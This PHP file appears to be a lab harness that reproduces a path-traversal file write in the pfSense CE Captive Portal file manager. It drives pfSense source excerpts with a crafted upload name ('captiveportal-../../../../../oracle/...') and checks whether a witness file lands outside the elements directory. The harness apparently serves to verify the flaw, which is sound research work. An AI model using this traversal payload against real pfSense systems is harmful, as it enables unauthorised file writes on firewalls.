<?php
/**
 * pfSense CE 2.9.0-DEVELOPMENT Captive Portal file-manager path-write gadget.
 * Pin 9363ac5b8651a1c7a333180425ce7719070f95f9. Priv page-services-captiveportal-filemanager.
 */

require __DIR__ . '/stubs.php';
require __DIR__ . '/pin-src/globals.inc.excerpt.php';
require __DIR__ . '/pin-src/util.inc.excerpt.php';
require __DIR__ . '/pin-src/captiveportal.inc.excerpt.php';
require __DIR__ . '/pin-src/services_captiveportal_filemanager.php.excerpt.php';

ini_set('display_errors', '0');

const WITNESS = 'PFSENSE-CP-FILEMANAGER-WRITE-WITNESS';
const WITNESS_PATH = '/oracle/PFSENSE-CP-FILEMANAGER-WRITE-WITNESS';
const PIN_SHA = '9363ac5b8651a1c7a333180425ce7719070f95f9';
const PIN_VERSION = '2.9.0-DEVELOPMENT';
const CONTROL_NAME = 'logo.png';
const PREFIX_NAME = '../../oracle/PFSENSE-CP-FILEMANAGER-WRITE-WITNESS';
const TRIGGER_NAME = 'captiveportal-../../../../../oracle/PFSENSE-CP-FILEMANAGER-WRITE-WITNESS';
const CONTROL_BODY = 'control-logo';
const TRIGGER_BODY = 'PFSENSE-CP-FILEMANAGER-WRITE-WITNESS';

$cpzone = 'lab';

function lab_dirs(): void {
	@mkdir('/var/db/cpelements', 0777, true);
	@mkdir('/usr/local/captiveportal', 0777, true);
	@mkdir('/oracle', 0777, true);
}

function rm_tree(string $root): void {
	if (!is_dir($root)) {
		return;
	}
	$it = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
		RecursiveIteratorIterator::CHILD_FIRST
	);
	foreach ($it as $item) {
		if ($item->isDir()) {
			@rmdir($item->getPathname());
		} else {
			@unlink($item->getPathname());
		}
	}
}

function reset_lab(): void {
	global $config, $cpzone;
	$config = array();
	$GLOBALS['lab_write_config'] = false;
	$GLOBALS['lab_write_desc'] = '';
	if (is_file(WITNESS_PATH)) {
		@unlink(WITNESS_PATH);
	}
	rm_tree('/var/db/cpelements');
	rm_tree('/usr/local/captiveportal');
	lab_dirs();
	config_set_path("captiveportal/{$cpzone}", array('element' => array()));
}

function list_files(string $root): array {
	$out = array();
	if (!is_dir($root)) {
		return $out;
	}
	$it = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS)
	);
	foreach ($it as $item) {
		if ($item->isFile() || $item->isLink()) {
			$out[] = $item->getPathname();
		}
	}
	sort($out);
	return $out;
}

function path_under(string $path, string $root): bool {
	$real_path = realpath($path);
	$real_root = realpath($root);
	if ($real_path === false || $real_root === false) {
		return false;
	}
	$root_slash = rtrim($real_root, '/') . '/';
	return $real_path === $real_root || str_starts_with($real_path, $root_slash);
}

function witness_state(): array {
	$exists = is_file(WITNESS_PATH);
	$body = '';
	if ($exists) {
		$read = file_get_contents(WITNESS_PATH);
		$body = ($read === false) ? '' : $read;
	}
	$real = $exists ? realpath(WITNESS_PATH) : false;
	return array(
		'exists' => $exists,
		'body' => $body,
		'path' => WITNESS_PATH,
		'realpath' => ($real === false) ? null : $real,
		'under_cpelements' => $exists && path_under(WITNESS_PATH, g_get('captiveportal_element_path')),
	);
}

function send_json($status, $payload): void {
	http_response_code($status);
	header('Content-Type: application/json; charset=utf-8');
	echo json_encode($payload, JSON_UNESCAPED_SLASHES);
	exit(0);
}

function send_text($status, $body): void {
	http_response_code($status);
	header('Content-Type: text/plain; charset=utf-8');
	echo $body;
	exit(0);
}

function request_json(): array {
	static $decoded = null;
	static $read = false;
	if ($read) {
		return is_array($decoded) ? $decoded : array();
	}
	$read = true;
	$raw = file_get_contents('php://input');
	if (!is_string($raw) || $raw === '') {
		$decoded = array();
		return $decoded;
	}
	$parsed = json_decode($raw, true);
	$decoded = is_array($parsed) ? $parsed : array();
	return $decoded;
}

function request_field(string $key, string $default = ''): string {
	if (isset($_POST[$key]) && is_string($_POST[$key])) {
		return $_POST[$key];
	}
	if (isset($_GET[$key]) && is_string($_GET[$key])) {
		return $_GET[$key];
	}
	$body = request_json();
	if (isset($body[$key]) && is_string($body[$key])) {
		return $body[$key];
	}
	return $default;
}

function pin_source(): string {
	$files = array(
		__DIR__ . '/pin-src/globals.inc.excerpt.php',
		__DIR__ . '/pin-src/services_captiveportal_filemanager.php.excerpt.php',
		__DIR__ . '/pin-src/captiveportal.inc.excerpt.php',
		__DIR__ . '/pin-src/util.inc.excerpt.php',
	);
	$parts = array();
	foreach ($files as $path) {
		$parts[] = file_get_contents($path);
	}
	return implode("\n", $parts);
}

function run_upload(string $client_name, string $body): array {
	global $g, $cpzone;

	$tmp = tempnam('/tmp', 'cpel');
	file_put_contents($tmp, $body);
	$_FILES['new'] = array(
		'name' => $client_name,
		'tmp_name' => $tmp,
		'size' => strlen($body),
		'error' => 0,
		'type' => 'application/octet-stream',
	);

	$prefixed = (stristr($client_name, 'captiveportal-') === false) && ($client_name !== 'favicon.ico');
	ob_start();
	list($stored, $write_rc) = filemanager_store_uploaded_file();
	ob_end_clean();
	@unlink($tmp);

	$intended = g_get('captiveportal_element_path') . '/' . $stored;
	$control_path = g_get('captiveportal_element_path') . '/captiveportal-logo.png';
	$portal_path = $g['captiveportal_path'] . '/' . $stored;
	$witness = witness_state();
	$cpe_files = list_files(g_get('captiveportal_element_path'));
	$portal_files = list_files($g['captiveportal_path']);
	$intended_exists = is_file($intended) || is_link($intended);
	$outside = $witness['exists'] && !$witness['under_cpelements'];

	return array(
		'name_posted' => $client_name,
		'name_stored' => $stored,
		'prefixed' => $prefixed,
		'write_rc' => $write_rc,
		'intended' => $intended,
		'intended_exists' => $intended_exists,
		'control_path_exists' => is_file($control_path),
		'portal_path' => $portal_path,
		'portal_exists' => is_file($portal_path) || is_link($portal_path),
		'cpelements' => g_get('captiveportal_element_path'),
		'cpe_files' => $cpe_files,
		'portal_files' => $portal_files,
		'outside' => $outside,
		'write_config' => $GLOBALS['lab_write_config'],
		'write_desc' => $GLOBALS['lab_write_desc'],
		'privilege' => 'page-services-captiveportal-filemanager',
		'witness' => $witness,
	);
}

lab_dirs();

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
if (!is_string($path) || $path === '') {
	$path = '/';
}

if ($path === '/ping') {
	send_json(200, array(
		'ok' => true,
		'pong' => 'pong',
		'version' => PIN_VERSION,
		'sha' => PIN_SHA,
		'privilege' => 'page-services-captiveportal-filemanager',
		'captiveportal_element_path' => g_get('captiveportal_element_path'),
		'captiveportal_path' => g_get('captiveportal_path'),
		'witness_path' => WITNESS_PATH,
		'control_name' => CONTROL_NAME,
		'trigger_name' => TRIGGER_NAME,
	));
}

if ($path === '/source') {
	$src = pin_source();
	if (!is_string($src) || $src === '') {
		send_text(500, 'source-read-failed');
	}
	send_text(200, $src);
}

if ($path === '/oracle') {
	send_json(200, witness_state());
}

if ($path === '/control') {
	reset_lab();
	$logo_name = request_field('name', CONTROL_NAME);
	if ($logo_name === '') {
		$logo_name = CONTROL_NAME;
	}
	$logo = run_upload($logo_name, CONTROL_BODY);
	reset_lab();
	$prefix = run_upload(PREFIX_NAME, TRIGGER_BODY);
	send_json(200, array(
		'ok' => true,
		'case' => 'control',
		'logo' => $logo,
		'prefix_block' => $prefix,
		'witness' => witness_state(),
	));
}

if ($path === '/trigger') {
	reset_lab();
	$trig_name = request_field('name', TRIGGER_NAME);
	if ($trig_name === '') {
		$trig_name = TRIGGER_NAME;
	}
	$trig = run_upload($trig_name, TRIGGER_BODY);
	send_json(200, array(
		'ok' => true,
		'case' => 'trigger',
		'trigger' => $trig,
		'witness' => witness_state(),
	));
}

send_json(404, array('error' => 'not-found', 'path' => $path));
